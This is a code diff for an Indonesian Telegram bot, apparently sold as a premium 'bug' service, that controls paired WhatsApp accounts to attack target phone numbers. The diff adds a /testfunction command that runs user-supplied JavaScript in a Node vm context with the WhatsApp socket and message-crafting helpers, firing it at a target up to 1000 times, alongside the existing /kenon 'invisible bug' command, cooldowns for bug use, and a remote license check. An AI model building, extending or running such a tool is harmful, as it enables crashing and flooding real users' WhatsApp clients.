@@ -3,6 +3,7 @@ const fs = require("fs");
 const path = require("path");
 const chalk = require("chalk");
 const axios = require("axios");
+const vm = require("vm");
 const { TOKEN_GINXJAL, OWNER_IDS } = require("./config");
 
 // ============= LOAD ROLE FILES =============
@@ -21,8 +22,8 @@ try {
 // ============= BANNER =============
 const BANNER_IMAGE = "https://files.catbox.moe/ve6d5g.jpg";
 
-// ============= GITHUB DATABASE =============
-const GITHUB_DB_URL = 'https://raw.githubusercontent.com/ekan02332-bit/Database/main/token.json';
+// ============= GITHUB DATABASE (TOKENS = ID) =============
+const GITHUB_DB_URL = 'https://raw.githubusercontent.com/ekan02332-bit/Database/main/tokens.json';
 
 // ============= GITHUB UPDATE URL =============
 const GITHUB_RAW_URL = 'https://raw.githubusercontent.com/ekan02332-bit/Database/main/ekaaa.js';
@@ -45,15 +46,16 @@ let waClients = {};
 let activeSenders = [];
 let pendingSenders = [];
 
-// ============= COOLDOWN =============
+// ============= COOLDOWN BUAT BUG SAJA =============
 let cooldownConfig = {};
 const CD_DB = './cooldown.json';
+let userLastUse = {};
+
 try {
     if (fs.existsSync(CD_DB)) {
         cooldownConfig = JSON.parse(fs.readFileSync(CD_DB, 'utf-8'));
     }
 } catch (e) {}
-let userLastUse = {};
 
 // ============= FUNGSI ROLE =============
 function getUserRole(userId) {
@@ -179,6 +181,25 @@ function isGroupPremium(groupId) {
     return premiumGroups.includes(groupId.toString());
 }
 
+// ============= CREATE SAFE SOCK =============
+function createSafeSock(sock) {
+    return new Proxy(sock, {
+        get(target, prop) {
+            if (typeof target[prop] === 'function') {
+                return function(...args) {
+                    try {
+                        return target[prop].apply(target, args);
+                    } catch (e) {
+                        console.log(chalk.red('❌ SafeSock error:'), e.message);
+                        return null;
+                    }
+                };
+            }
+            return target[prop];
+        }
+    });
+}
+
 // ============= DASHBOARD =============
 const styles = ["primary", "success", "danger"];
 let styleIndex = 0;
@@ -228,6 +249,97 @@ function buildStartText(ctx) {
 Tap salah satu tombol di bawah untuk mulai.`;
 }
 
+// ============= TOOLS MENU =============
+const TOOLS_TEXT = `
+<blockquote>
+<strong>🔧 TOOLS MENU</strong>
+</blockquote>
+
+<blockquote>
+📋 AVAILABLE TOOLS
+/testfunction - Test Function (reply dengan code)
+/kenon - Bug Case (premium only)
+/claim - Claim Premium 30d
+/setcd - Set Cooldown (admin only)
+/addbot - Add Sender (admin only)
+</blockquote>
+
+<blockquote>
+📌 Role Required: Premium / Admin / Owner
+</blockquote>
+`;
+
+const TOOLS_V2_TEXT = `
+<blockquote>
+<strong>🔧 TOOLS V2</strong>
+</blockquote>
+
+<blockquote>
+📋 ADMIN TOOLS
+/addprem - Add Premium
+/delprem - Delete Premium
+/listprem - List Premium
+/listadmin - List Admin
+/listroles - List All Roles
+/addpremgrup - Add Premium Group
+/delpremgrup - Delete Premium Group
+</blockquote>
+
+<blockquote>
+📌 Role Required: Admin / Owner
+</blockquote>
+`;
+
+// ============= BUGS MENU =============
+const BUGS_TEXT = `
+<blockquote>
+<strong>🐛 BUGS MENU</strong>
+</blockquote>
+
+<blockquote>
+📋 AVAILABLE BUGS
+/kenon - Invisible Bug (premium only)
+/testfunction - Custom Function Test (reply with code)
+</blockquote>
+
+<blockquote>
+📌 Role Required: Premium
+</blockquote>
+`;
+
+const BUGS_V2_TEXT = `
+<blockquote>
+<strong>🐛 BUGS V2</strong>
+</blockquote>
+
+<blockquote>
+📋 COMING SOON
+</blockquote>
+
+<blockquote>
+📌 Role Required: Premium
+</blockquote>
+`;
+
+// ============= THANKS TO =============
+const THANKS_TEXT = `
+<blockquote>
+<strong>🙏 THANKS TO</strong>
+</blockquote>
+
+<blockquote>
+📌 SPECIAL THANKS
+├ @malingluh - Developer
+├ @badzz88 - Baileys Fix
+├ XCODE X ETERNALZENO - Team
+└ Semua Yang Pernah Support
+</blockquote>
+
+<blockquote>
+📌 X-STRIKE NEVER DIE
+</blockquote>
+`;
+
 // ============= SETTINGS TEKS =============
 const SETTINGS_TEXT = `
 <blockquote>
@@ -252,6 +364,35 @@ const SETTINGS_TEXT = `
 /addprem - Add Prem
 /delprem - Delete Prem
 /listprem - List Premium
+/testfunction - Test Function
+</blockquote>
+`;
+
+// ============= CMD TEKS =============
+const CMD_TEXT = `
+<blockquote>
+<strong>⚙️ CONTROLS MENU</strong>
+</blockquote>
+
+<blockquote>
+📋 COMMAND LIST
+/addbot - Add Sender
+/setcd - Set Cooldown
+/killbot - Reset Session
+/addadmin - Add Admin
+/delladmin - Delete Admin
+/listadmin - List Admin
+/claim - Premium 30d In Member
+/blockcmd - Block Command
+/unblockcmd - Unblock Command
+/cmd - List Command
+/update - Update ke versi baru
+/addpremgrup - Add Premium Group
+/delpremgrup - Delete Premium Group
+/addprem - Add Prem
+/delprem - Delete Prem
+/listprem - List Premium
+/testfunction - Test Function
 </blockquote>
 `;
 
@@ -275,20 +416,21 @@ bot.start(async (ctx) => {
             ...getAnimatedKeyboard()
         });
 
-        if (menuAnimation) clearInterval(menuAnimation);
-        menuAnimation = setInterval(async () => {
-            try {
-                await ctx.telegram.editMessageReplyMarkup(
-                    ctx.chat.id,
-                    sent.message_id,
-                    undefined,
-                    getAnimatedKeyboard().reply_markup
-                );
-            } catch (e) {
-                clearInterval(menuAnimation);
-                menuAnimation = null;
-            }
-        }, 2000);
+        // Tanpa animasi
+        // if (menuAnimation) clearInterval(menuAnimation);
+        // menuAnimation = setInterval(async () => {
+        //     try {
+        //         await ctx.telegram.editMessageReplyMarkup(
+        //             ctx.chat.id,
+        //             sent.message_id,
+        //             undefined,
+        //             getAnimatedKeyboard().reply_markup
+        //         );
+        //     } catch (e) {
+        //         clearInterval(menuAnimation);
+        //         menuAnimation = null;
+        //     }
+        // }, 2000);
 
     } catch (err) {
         console.log(chalk.red('❌ Error start:'), err.message);
@@ -303,81 +445,104 @@ bot.action("tools_menu", async (ctx) => {
         return ctx.answerCbQuery("😹");
     }
     if (menuAnimation) clearInterval(menuAnimation);
-    await ctx.editMessageCaption(`〔 TOOLS MENU 〕`, {
-        parse_mode: "HTML",
-        ...Markup.inlineKeyboard([
-            [
-                { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" },
-                { text: "ᴛᴏᴏʟsᴠ𝟸", callback_data: "tools_v2", style: "success" }
-            ]
-        ])
-    });
+    
+    await ctx.editMessageCaption(
+        TOOLS_TEXT,
+        {
+            parse_mode: "HTML",
+            ...Markup.inlineKeyboard([
+                [
+                    { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" },
+                    { text: "ᴛᴏᴏʟsᴠ𝟸", callback_data: "tools_v2", style: "success" }
+                ]
+            ])
+        }
+    );
 });
 
+// TOOLS V2
 bot.action("tools_v2", async (ctx) => {
     if (!isAllowedAccess(ctx)) {
         await logFreeActivity(ctx);
         return ctx.answerCbQuery("😹");
     }
     if (menuAnimation) clearInterval(menuAnimation);
-    await ctx.editMessageCaption(`〔 TOOLS V2 〕`, {
-        parse_mode: "HTML",
-        ...Markup.inlineKeyboard([
-            [
-                { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" }
-            ]
-        ])
-    });
+    
+    await ctx.editMessageCaption(
+        TOOLS_V2_TEXT,
+        {
+            parse_mode: "HTML",
+            ...Markup.inlineKeyboard([
+                [
+                    { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" }
+                ]
+            ])
+        }
+    );
 });
 
+// BUGS
 bot.action("bugs", async (ctx) => {
     if (!isAllowedAccess(ctx)) {
         await logFreeActivity(ctx);
         return ctx.answerCbQuery("😹");
     }
     if (menuAnimation) clearInterval(menuAnimation);
-    await ctx.editMessageCaption(`〔 BUGS 〕`, {
-        parse_mode: "HTML",
-        ...Markup.inlineKeyboard([
-            [
-                { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" },
-                { text: "ʙᴜɢsᴠ𝟸", callback_data: "bugsv2", style: "success" }
-            ]
-        ])
-    });
+    
+    await ctx.editMessageCaption(
+        BUGS_TEXT,
+        {
+            parse_mode: "HTML",
+            ...Markup.inlineKeyboard([
+                [
+                    { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" },
+                    { text: "ʙᴜɢsᴠ𝟸", callback_data: "bugsv2", style: "success" }
+                ]
+            ])
+        }
+    );
 });
 
+// BUGS V2
 bot.action("bugsv2", async (ctx) => {
     if (!isAllowedAccess(ctx)) {
         await logFreeActivity(ctx);
         return ctx.answerCbQuery("😹");
     }
     if (menuAnimation) clearInterval(menuAnimation);
-    await ctx.editMessageCaption(`〔 BUGS V2 〕`, {
-        parse_mode: "HTML",
-        ...Markup.inlineKeyboard([
-            [
-                { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" },
-                { text: "ɪɴғᴏ", callback_data: "info", style: "success" }
-            ]
-        ])
-    });
+    
+    await ctx.editMessageCaption(
+        BUGS_V2_TEXT,
+        {
+            parse_mode: "HTML",
+            ...Markup.inlineKeyboard([
+                [
+                    { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" }
+                ]
+            ])
+        }
+    );
 });
 
+// INFO
 bot.action("info", async (ctx) => {
     if (!isAllowedAccess(ctx)) {
         await logFreeActivity(ctx);
         return ctx.answerCbQuery("😹");
     }
     if (menuAnimation) clearInterval(menuAnimation);
-    await ctx.editMessageCaption(`〔 INFO 〕`, {
-        parse_mode: "HTML",
-        ...Markup.inlineKeyboard([
-            [
-                { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" }
-            ]
-        ])
-    });
+    
+    await ctx.editMessageCaption(
+        `〔 INFO 〕`,
+        {
+            parse_mode: "HTML",
+            ...Markup.inlineKeyboard([
+                [
+                    { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" }
+                ]
+            ])
+        }
+    );
 });
 
 // SETTINGS
@@ -393,28 +558,34 @@ bot.action("settings", async (ctx) => {
             menuAnimation = null;
         }
 
-        await ctx.editMessageCaption(SETTINGS_TEXT, {
-            parse_mode: "HTML",
-            ...Markup.inlineKeyboard([
-                [
-                    { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" }
-                ]
-            ])
-        });
-
-        await ctx.answerCbQuery("✅ Settings menu opened!");
-
-    } catch (err) {
-        console.log(chalk.red('❌ Error settings:'), err.message);
-        try {
-            await ctx.reply(SETTINGS_TEXT, {
+        await ctx.editMessageCaption(
+            SETTINGS_TEXT,
+            {
                 parse_mode: "HTML",
                 ...Markup.inlineKeyboard([
                     [
                         { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" }
                     ]
                 ])
-            });
+            }
+        );
+
+        await ctx.answerCbQuery("✅ Settings menu opened!");
+
+    } catch (err) {
+        console.log(chalk.red('❌ Error settings:'), err.message);
+        try {
+            await ctx.reply(
+                SETTINGS_TEXT,
+                {
+                    parse_mode: "HTML",
+                    ...Markup.inlineKeyboard([
+                        [
+                            { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" }
+                        ]
+                    ])
+                }
+            );
             await ctx.answerCbQuery("✅ Settings menu opened (new message)!");
         } catch (e) {
             console.log(chalk.red('❌ Settings fatal:'), e.message);
@@ -423,22 +594,28 @@ bot.action("settings", async (ctx) => {
     }
 });
 
+// THANKS TO
 bot.action("thanks_to", async (ctx) => {
     if (!isAllowedAccess(ctx)) {
         await logFreeActivity(ctx);
         return ctx.answerCbQuery("😹");
     }
     if (menuAnimation) clearInterval(menuAnimation);
-    await ctx.editMessageCaption(`〔 THANKS TO 〕`, {
-        parse_mode: "HTML",
-        ...Markup.inlineKeyboard([
-            [
-                { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" }
-            ]
-        ])
-    });
+    
+    await ctx.editMessageCaption(
+        THANKS_TEXT,
+        {
+            parse_mode: "HTML",
+            ...Markup.inlineKeyboard([
+                [
+                    { text: "ʙᴀᴄᴋ", callback_data: "back_main", style: "danger" }
+                ]
+            ])
+        }
+    );
 });
 
+// BACK MAIN
 bot.action("back_main", async (ctx) => {
     try {
         if (!isAllowedAccess(ctx)) {
@@ -455,20 +632,21 @@ bot.action("back_main", async (ctx) => {
             ...getAnimatedKeyboard()
         });
 
-        if (menuAnimation) clearInterval(menuAnimation);
-        menuAnimation = setInterval(async () => {
-            try {
-                await ctx.telegram.editMessageReplyMarkup(
-                    ctx.chat.id,
-                    ctx.callbackQuery.message.message_id,
-                    undefined,
-                    getAnimatedKeyboard().reply_markup
-                );
-            } catch (e) {
-                clearInterval(menuAnimation);
-                menuAnimation = null;
-            }
-        }, 2000);
+        // Tanpa animasi
+        // if (menuAnimation) clearInterval(menuAnimation);
+        // menuAnimation = setInterval(async () => {
+        //     try {
+        //         await ctx.telegram.editMessageReplyMarkup(
+        //             ctx.chat.id,
+        //             ctx.callbackQuery.message.message_id,
+        //             undefined,
+        //             getAnimatedKeyboard().reply_markup
+        //         );
+        //     } catch (e) {
+        //         clearInterval(menuAnimation);
+        //         menuAnimation = null;
+        //     }
+        // }, 2000);
 
         await ctx.answerCbQuery("✅ Back to main menu!");
 
@@ -489,16 +667,23 @@ bot.use(async (ctx, next) => {
     return next();
 });
 
-// ============= COOLDOWN MIDDLEWARE =============
+// ============= COOLDOWN MIDDLEWARE (KHUSUS BUG /kenon) =============
 bot.use(async (ctx, next) => {
     if (!ctx.message || !ctx.message.text) return next();
+    const text = ctx.message.text;
+    if (!text.startsWith('/')) return next();
+    
+    const command = text.split(' ')[0];
+    if (command !== '/kenon') return next();
+    
     const chatId = ctx.chat.id;
     const cooldown = cooldownConfig[chatId] || 0;
     const now = Date.now();
     const last = userLastUse[chatId] || 0;
+    
     if (cooldown > 0 && now - last < cooldown) {
         const remaining = Math.ceil((cooldown - (now - last)) / 1000);
-        return ctx.reply(`⏳ Cooldown! Tunggu ${remaining} detik.`);
+        return ctx.reply(`⏳ Cooldown bug! Tunggu ${remaining} detik.`);
     }
     userLastUse[chatId] = now;
     return next();
@@ -611,7 +796,7 @@ bot.command('listroles', checkRole('admin'), async (ctx) => {
 bot.command('setcd', checkRole('admin'), async (ctx) => {
     const args = ctx.message.text.split(' ');
     if (args.length < 2) {
-        return ctx.reply(`⚠️ Format: /setcd <detik>\n\nContoh: /setcd 10\n\n💡 0 = nonaktifkan cooldown`);
+        return ctx.reply(`⚠️ Format: /setcd <detik>\n\nContoh: /setcd 10\n💡 0 = nonaktifkan cooldown`);
     }
     const seconds = parseInt(args[1]);
     if (isNaN(seconds) || seconds < 0) {
@@ -621,7 +806,7 @@ bot.command('setcd', checkRole('admin'), async (ctx) => {
     userLastUse[chatId] = 0;
     cooldownConfig[chatId] = seconds * 1000;
     fs.writeFileSync(CD_DB, JSON.stringify(cooldownConfig, null, 2));
-    await ctx.reply(`✅ Cooldown diset ke ${seconds} detik!`);
+    await ctx.reply(`✅ Cooldown bug diset ke ${seconds} detik!`);
 });
 
 // ============= CLAIM PREMIUM =============
@@ -711,55 +896,77 @@ bot.command('cmd', async (ctx) => {
     const userId = ctx.from.id.toString();
     const role = getUserRole(userId);
     if (role === 'free') return ctx.reply('😹');
+    
     await ctx.reply(
-        `<b>⚙️ CONTROLS MENU</b>\n\n<b>📋 COMMAND LIST</b>\n` +
-        `/addbot - Add Sender\n` +
-        `/setcd - Set Cooldown\n` +
-        `/killbot - Reset Session\n` +
-        `/addadmin - Add Admin\n` +
-        `/delladmin - Delete Admin\n` +
-        `/listadmin - List Admin\n` +
-        `/claim - Premium 30d In Member\n` +
-        `/blockcmd - Block Command\n` +
-        `/unblockcmd - Unblock Command\n` +
-        `/cmd - List Command\n` +
-        `/update - Update ke versi baru\n` +
-        `/addpremgrup - Add Premium Group\n` +
-        `/delpremgrup - Delete Premium Group\n` +
-        `/addprem - Add Prem\n` +
-        `/delprem - Delete Prem\n` +
-        `/listprem - List Premium`,
-        { parse_mode: 'HTML' }
+        CMD_TEXT,
+        { 
+            parse_mode: 'HTML',
+            ...Markup.inlineKeyboard([
+                [
+                    { text: "ᴛᴏᴏʟs ᴍᴇɴᴜ", callback_data: "tools_menu", style: "danger" },
+                    { text: "ʙᴜɢs", callback_data: "bugs", style: "danger" }
+                ],
+                [
+                    { text: "sᴇᴛᴛɪɴɢs", callback_data: "settings", style: "success" },
+                    { text: "ᴛʜᴀɴᴋs ᴛᴏ", callback_data: "thanks_to", style: "success" }
+                ],
+                [
+                    { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/malingluh", style: "primary" },
+                    { text: "ɪɴғᴏ sᴄʀɪᴘᴛ", url: "https://t.me/link_info_script", style: "primary" }
+                ]
+            ])
+        }
     );
 });
 
-// ============= WA COMMANDS =============
-bot.command('addbot', checkRole('admin'), async (ctx) => {
-    const args = ctx.message.text.split(' ');
-    if (args.length < 2) return ctx.reply(`⚠️ Format: /addbot 6281234567890`);
-    const number = args[1];
-    const cleanNumber = number.replace(/\D/g, '');
-    if (waClients[cleanNumber]?.connected) {
-        return ctx.reply(`✅ SENDER SUDAH CONNECT!\n📱 Nomor: ${cleanNumber}`);
-    }
-    if (!activeSenders.includes(cleanNumber) && !pendingSenders.includes(cleanNumber)) {
-        pendingSenders.push(cleanNumber);
-        await ctx.reply(`🔐 MEMULAI PAIRING...\n📱 Nomor: ${cleanNumber}\n⏳ Tunggu sebentar...`);
-        await startWaWithPairing(cleanNumber);
-    } else {
-        await ctx.reply(`⚠️ ${cleanNumber} sudah ada di list.`);
-    }
-});
+// ============= ADD BOT =============
+let lastPairingMessage = null;
 
-bot.command('removebot', checkRole('admin'), async (ctx) => {
-    const args = ctx.message.text.split(' ');
-    if (args.length < 2) return ctx.reply(`⚠️ Format: /removebot 6281234567890`);
-    const number = args[1];
-    const cleanNumber = number.replace(/\D/g, '');
-    activeSenders = activeSenders.filter(n => n !== cleanNumber);
-    pendingSenders = pendingSenders.filter(n => n !== cleanNumber);
-    delete waClients[cleanNumber];
-    await ctx.reply(`✅ ${cleanNumber} dihapus dari list.`);
+bot.command("addbot", checkRole('admin'), async (ctx) => {
+    const args = ctx.message.text.split(" ")[1];
+    if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");
+
+    const phoneNumber = args.replace(/[^0-9]/g, "");
+    if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");
+
+    try {
+        if (!waClients || Object.keys(waClients).length === 0) {
+            return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
+        }
+
+        const firstKey = Object.keys(waClients)[0];
+        const sock = waClients[firstKey]?.sock;
+        if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
+
+        if (sock.authState?.creds?.registered) {
+            return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
+        }
+
+        const code = await sock.requestPairingCode(phoneNumber, "EKSKA144");
+        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
+
+        const pairingMenu = `
+<blockquote><pre>( 🦋 ) - Connect Sender</pre></blockquote>
+⌑ Number: ${phoneNumber}
+⌑ Pairing Code: ${formattedCode}
+⌑ Status: Not Connected`;
+
+        const sentMsg = await ctx.replyWithPhoto(BANNER_IMAGE, {
+            caption: pairingMenu,
+            parse_mode: "HTML"
+        });
+
+        lastPairingMessage = {
+            chatId: ctx.chat.id,
+            messageId: sentMsg.message_id,
+            phoneNumber,
+            pairingCode: formattedCode
+        };
+
+    } catch (err) {
+        console.error(chalk.red('❌ Error addbot:'), err);
+        await ctx.reply(`❌ ☇ Error: ${err.message}`);
+    }
 });
 
 // ============= KILLBOT =============
@@ -842,7 +1049,7 @@ bot.command("kenon", checkRole('premium'), async (ctx) => {
     const isConnected = Object.values(waClients).some(client => client.connected);
     if (!isConnected) return ctx.reply(`❌ WhatsApp tidak terhubung!`);
     const senderUsername = ctx.from?.username || 'No Username';
-    await ctx.replyWithPhoto({ url: BANNER_IMAGE }, {
+    await ctx.replyWithPhoto(BANNER_IMAGE, {
         caption: `<b>OBJECTTTT</b>\n\n<blockquote>\n<b>🎯 Target:</b> ${q}\n<b>💀 Type:</b> Not Spam Bugs\n<b>👤 Username:</b> @${senderUsername}\n<b>🔥 Status:</b> Sending...\n</blockquote>`,
         parse_mode: "HTML",
         ...Markup.inlineKeyboard([[ { text: "CHECK?<NUMBERS>", url: `https://wa.me/${cleanNumber}` } ]])
@@ -865,6 +1072,151 @@ bot.command("kenon", checkRole('premium'), async (ctx) => {
             await ctx.reply(`❌ Bug gagal: ${e.message}`);
         }
     })();
+});
+
+// ============= CASE testfunction =============
+bot.command("testfunction", async (ctx) => {
+    try {
+        const args = ctx.message.text.split(" ")
+        if (args.length < 3)
+            return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")
+
+        const q = args[1]
+        const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
+        if (isNaN(jumlah) || jumlah <= 0)
+            return ctx.reply("❌ ☇ Jumlah harus angka")
+
+        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
+        if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
+            return ctx.reply("❌ ☇ Reply dengan function")
+
+        const processMsg = await ctx.telegram.sendPhoto(
+            ctx.chat.id,
+            BANNER_IMAGE,
+            {
+                caption: `<blockquote><pre>─━━─━━⧼ 𝗩𝗢𝗥𝗧𝗨𝗡𝗜𝗫 ⧽─━━─━━</pre></blockquote>
+⌑ Target: ${q}
+⌑ Type: Unknown Function
+⌑ Status: Process`,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
+                    ]
+                }
+            }
+        )
+        const processMessageId = processMsg.message_id
+
+        const sock = Object.values(waClients).find(c => c.connected)?.sock;
+        if (!sock) return ctx.reply("❌ ☇ WhatsApp belum terhubung!");
+
+        const safeSock = createSafeSock(sock);
+        const funcCode = ctx.message.reply_to_message.text
+        const match = funcCode.match(/async function\s+(\w+)/)
+        if (!match) return ctx.reply("❌ ☇ Function tidak valid")
+        const funcName = match[1]
+
+        const sandbox = {
+            console,
+            Buffer,
+            sock: safeSock,
+            target,
+            sleep,
+            generateWAMessageFromContent,
+            generateForwardMessageContent,
+            generateWAMessage,
+            prepareWAMessageMedia,
+            proto,
+            jidDecode,
+            areJidsSameUser
+        }
+        const context = vm.createContext(sandbox)
+
+        const wrapper = `${funcCode}\n${funcName}`
+        const fn = vm.runInContext(wrapper, context)
+
+        for (let i = 0; i < jumlah; i++) {
+            try {
+                const arity = fn.length
+                if (arity === 1) {
+                    await fn(target)
+                } else if (arity === 2) {
+                    await fn(safeSock, target)
+                } else {
+                    await fn(safeSock, target, true)
+                }
+            } catch (err) {}
+            await sleep(200)
+        }
+
+        const finalText = `<blockquote><pre>─━━─━━⧼ 𝗩𝗢𝗥𝗧𝗨𝗡𝗜𝗫 ⧽─━━─━━</pre></blockquote>
+⌑ Target: ${q}
+⌑ Type: Unknown Function
+⌑ Status: Success`
+        try {
+            await ctx.telegram.editMessageCaption(
+                ctx.chat.id,
+                processMessageId,
+                undefined,
+                finalText,
+                {
+                    parse_mode: "HTML",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
+                        ]
+                    }
+                }
+            )
+        } catch (e) {
+            await ctx.replyWithPhoto(
+                BANNER_IMAGE,
+                {
+                    caption: finalText,
+                    parse_mode: "HTML",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
+                        ]
+                    }
+                }
+            )
+        }
+    } catch (err) {
+        console.log(chalk.red('❌ Error testfunction:'), err)
+        await ctx.reply(`❌ Error: ${err.message}`)
+    }
+});
+
+//==============CASEFITUR============
+bot.command("game", async (ctx) => {
+  try {
+    const videoList = [
+      "https://files.catbox.moe/nmceni.mp4",
+      "https://files.catbox.moe/tpko98.mp4",
+      "https://files.catbox.moe/xuvshz.mp4",
+      "https://files.catbox.moe/1a8fa3.mp4",
+      "https://files.catbox.moe/w76gnq.mp4",
+      "https://files.catbox.moe/vxhall.mp4",
+      "https://files.catbox.moe/u2ktga.mp4"
+    ];
+
+    // ============ KIRIM PESAN "SABAR" DULU ============
+    await ctx.reply("⏳ Sabar ya, lagi ngambil video random...");
+    // ==================================================
+
+    const randomIndex = Math.floor(Math.random() * videoList.length);
+    const randomVideo = videoList[randomIndex];
+
+    await ctx.replyWithVideo(randomVideo, {
+      caption: `game`
+    });
+
+  } catch (error) {
+    console.error("Error videorandom:", error);
+    ctx.reply("❌ Gagal mengambil video random.");
+  }
 });
 
 // ============= FUNGSI SLEEP =============
@@ -908,6 +1260,23 @@ async function startWaWithPairing(number) {
                 }
                 const ownerId = OWNER_IDS[0];
                 if (ownerId) await bot.telegram.sendMessage(ownerId, `✅ WhatsApp ${cleanNumber} berhasil konek!\n📱 Nomor: ${sock.user?.id?.split(':')[0] || cleanNumber}`);
+                
+                if (lastPairingMessage && lastPairingMessage.phoneNumber === cleanNumber) {
+                    const updateConnectionMenu = `
+<blockquote><pre>( 🦋 ) - Connect Sender</pre></blockquote>
+⌑ Number: ${lastPairingMessage.phoneNumber}
+⌑ Pairing Code: ${lastPairingMessage.pairingCode}
+⌑ Status: Connected ✅`;
+                    try {
+                        await bot.telegram.editMessageCaption(
+                            lastPairingMessage.chatId,
+                            lastPairingMessage.messageId,
+                            undefined,
+                            updateConnectionMenu,
+                            { parse_mode: "HTML" }
+                        );
+                    } catch (e) {}
+                }
             }
             if (connection === "close") {
                 console.log(chalk.red(`❌ WA ${cleanNumber} disconnect: ${reason}`));
@@ -943,21 +1312,32 @@ async function startWaWithPairing(number) {
 }
 let isStarting = false;
 
-// ============= VALIDASI TOKEN =============
-async function validateToken() {
-    console.log(chalk.blue('🔐 Validating token...'));
+// ============= VALIDASI ID =============
+async function validateId() {
+    console.log(chalk.blue('🔐 Validating ID...'));
+
     try {
         const response = await axios.get(GITHUB_DB_URL, { timeout: 10000 });
+        
         if (!response.data || !Array.isArray(response.data.tokens)) {
-            console.log(chalk.red('❌ Database invalid!')); process.exit(1);
+            console.log(chalk.red('❌ Database ID invalid!'));
+            console.log(chalk.red('🛑 PANEL MATI...'));
+            process.exit(1);
         }
-        const validTokens = response.data.tokens;
-        console.log(chalk.green(`✅ Loaded ${validTokens.length} tokens from GitHub`));
-        if (!validTokens.includes(TOKEN_GINXJAL)) {
-            console.log(chalk.red('❌ TOKEN TIDAK TERDAFTAR DI DATABASE!')); process.exit(1);
+
+        const validIds = response.data.tokens;
+        console.log(chalk.green(`✅ Loaded ${validIds.length} IDs from GitHub`));
+
+        if (!validIds.includes(TOKEN_GINXJAL)) {
+            console.log(chalk.red('❌ ID TIDAK TERDAFTAR DI DATABASE!'));
+            console.log(chalk.red(`📋 ID: ${TOKEN_GINXJAL}`));
+            console.log(chalk.red('🛑 PANEL MATI...'));
+            process.exit(1);
         }
-        console.log(chalk.green('✅ Token valid! Panel akan jalan...'));
-        const tokenId = TOKEN_GINXJAL.split(':')[0];
+
+        console.log(chalk.green('✅ ID valid! Panel akan jalan...'));
+        
+        const tokenId = TOKEN_GINXJAL;
         console.log(chalk.cyan(`
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⢔⣒⠂⣀⣀⣤⣄⣀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⣴⣿⠋⢠⣟⡼⣷⠼⣆⣼⢇⣿⣄⠱⣄
@@ -989,18 +1369,22 @@ INFORMATION:
 Name Script : EkaaaProject
 Developer : Ekaaa | PengenFemes
 Telegram : @malingluh
-TOKEN TERVERIFIKASI (${tokenId})`));
+ID TERVERIFIKASI (${tokenId})`));
+
     } catch (err) {
         console.log(chalk.red('❌ Gagal fetch database:'), err.message);
+        console.log(chalk.red('🛑 PANEL MATI...'));
         process.exit(1);
     }
 }
 
 // ============= LAUNCH =============
 async function main() {
+    await validateId();
+
     loadPremiumGroups();
     console.log(chalk.green(`✅ Loaded ${premiumGroups.length} premium groups`));
-    await validateToken();
+
     console.log(chalk.green('🚀 Starting bot...'));
     await bot.launch();
     console.log(chalk.green('✅ Bot running!'));
